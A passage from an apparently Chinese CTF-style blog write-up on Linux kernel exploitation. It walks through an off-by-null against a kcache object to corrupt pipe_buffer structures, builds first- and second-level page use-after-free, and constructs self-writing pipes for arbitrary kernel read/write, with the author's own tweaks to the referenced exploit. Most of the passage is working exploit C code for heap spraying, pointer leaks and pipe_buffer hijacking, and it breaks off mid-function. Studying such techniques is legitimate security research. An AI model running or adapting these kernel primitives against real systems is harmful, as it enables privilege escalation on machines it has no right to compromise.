<p>除此之外我们再选择将kcache_jar的slab夹在pipe_buffer的slab中间,以此来提高成功率</p>
<p>对应exp代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br><span class="line">            <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line">    .......</span><br><span class="line">    .......</span><br></pre></td></tr></table></figure>
<p>至此<code>off-by-null</code>利用完成</p>
<h3 id="第一次uaf"><a href="#第一次uaf" class="headerlink" title="第一次uaf"></a>第一次uaf</h3><p>在上一步我们完成了<code>off-by-null</code>的利用</p>
<p>如果一切顺利,那么我们现在已经掌握了一个可以uaf的页</p>
<p>如何检测是否成功拿到了这个页呢</p>
<p>首先我们在触发<code>off-by-null</code>之前先向所有管道写入一些标识信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么当<code>off-by-null</code>触发之后,如果我们再次遍历读取所有管道,如果一个管道发现其读取出的整型nr与当前游标i不同,那么我们就可以确认这个管道的pipe_buffer就是被<code>off-by-null</code>的那个</p>
<p>即<code>pipe[nr]</code>是被<code>off-by-null</code>的那个,<code>pipe[i]</code>是与其重叠那个原管道</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">        orig_pid = nr;</span><br><span class="line">        victim_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">               victim_pid, orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有人可能会好奇,为什么找到了victim后就直接break了,这样不是会有可能略过orig的读取,从而导致之后的读写不一致吗</p>
<p>这个因为其之后的操作都是基于victim的,所以不必担心</p>
<hr>
<p>不过还有一个疑问,就是一种极端情况</p>
<p>如果i=0时,就找到了victim,那么之后所有的pipe就都没进行读取,这样在第二次uaf的判断中,读取时不就会出现错误嘛</p>
<p>所以我个人认为可以就算找到了victim也不break,而是继续向下执行直到遍历完所有的pipe</p>
<p>当然其实必要性也不大,毕竟这个概率太小了,但我试了一下去除break其实确实是可行的</p>
<h3 id="第二次uaf"><a href="#第二次uaf" class="headerlink" title="第二次uaf"></a>第二次uaf</h3><p>现在我们已经有了一个可以uaf的页,并且可以读写上面的所有内容</p>
<p>我们首先释放这个uaf页,使其回到伙伴系统</p>
<p>之后再次利用fcntl修改剩余<code>pipe_buffer</code>的大小,使其重新分配,且刚好取出这个页作为slab</p>
<p>需要注意的是,因为之后还需要一次更改<code>pipe_buffer</code>大小,所以这次更改的大小要稍微讲究一些,即其所在slab是向order1申请内存,且objsize应该大于80,并刚好被2的幂次个pipe_buffer结构体选中作为obj</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc-cg-192       504    504    192   21    1 : tunables    0    0    0 : slabdata     24   0</span><br><span class="line">kmalloc-cg-96        252    252     96   42    1 : tunables    0    0    0 : slabdata      6   0</span><br></pre></td></tr></table></figure>
<p>我们选中这两个作为目标</p>
<p>所以此次我们需要修改的大小是<code>0x2000</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
<hr>
<p>在进一步解析之前先提一下<code>pipe_buffer</code>结构体中<code>offset</code>与<code>len</code>两个字段的作用</p>
<p><code>offset</code>指向未读取的数据偏移</p>
<p><code>len</code>代表未读取得数据得长度</p>
<p>也就是说</p>
<ul>
<li>对一个pipe进行read操作是从offset开始的,最多读取len长度</li>
<li>对一个pipe进行write操作是从offset+len处开始写起的</li>
</ul>
<p>因此我们可以看到exp中有很多用于平衡读写的操作</p>
<hr>
<p>继续exp的分析,在平衡好读写后,我们便可以读取到一个pipe_buffer的完整结构</p>
<p>然后我们再将其写到下一个pipe_buffer,这样我们又构造了一个uaf</p>
<p>之后用同样的办法找到目标管道</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span></span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> </span><br><span class="line">       <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>, </span><br><span class="line">       info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>) info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span></span><br><span class="line">    || (<span class="type">size_t</span>) info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* construct a second-level page uaf */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">info_pipe_buf.page = (<span class="keyword">struct</span> page*) ((<span class="type">size_t</span>) info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">        snd_orig_pid = nr;</span><br><span class="line">        snd_vicitm_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">               snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这一句</p>
<p><code>info_pipe_buf.page = (struct page*) ((size_t) info_pipe_buf.page + 0x40);</code></p>
<p><code>arttnba3</code>大佬将page指针+0x40之后才将其写到下一个pipe_buffer</p>
<p>而我认为这是没有必要的,甚至加了这一句之后其实反而不太好理解了,甚至如果不是random_list的作用,还可能下一个pipe_buffer的page本身就是读出的page指针+0x40</p>
<p>所以这一句代码是完全可以去除的,而我在去除后编译出的exp同样利用成功了,证实了我的猜测</p>
<h3 id="构建自写管道"><a href="#构建自写管道" class="headerlink" title="构建自写管道"></a>构建自写管道</h3><p>现在我们拥有了对应第二个uaf页的<code>struct page</code>指针</p>
<p>并且还能任意写第二个uaf页上的pipe_buffer结构体</p>
<p>那么不是可以控制其上的pipe_buffer指向自身所在页,进而控制pipe_buffer本身</p>
<p>这里我们需要控制三个pipe_buffer</p>
<p>从低到高我们分别称作A,B,C,</p>
<p>其中</p>
<ul>
<li>A用于任意读写</li>
<li>C负责控制A任意读写的范围,并在写完A后,向后移继续写B,使得B指向C</li>
<li>B负责将C重新指向A</li>
</ul>
<p>获取这三个pipe_buffer的方法和前面两步差不多,就不多说了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span 